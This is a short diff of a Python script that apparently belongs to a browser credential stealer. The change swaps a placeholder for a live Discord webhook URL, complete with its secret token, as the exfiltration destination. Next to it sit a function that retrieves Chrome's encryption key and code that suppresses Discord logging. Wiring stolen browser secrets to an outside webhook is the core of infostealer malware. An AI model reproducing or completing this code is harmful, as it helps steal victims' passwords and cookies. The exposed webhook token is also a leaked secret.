@@ -13,7 +13,7 @@ import subprocess
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 
-WEBHOOK_URL = 'webhook'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1398472154089127946/hqsmCirQoQk0xSGdhb5_qMGj-rF5HX9fa_SqwEduaWMtOuc8cr5X7c01o1gIXi-6QqwA'
 
 
 def get_encryption_key(browser="chrome"):
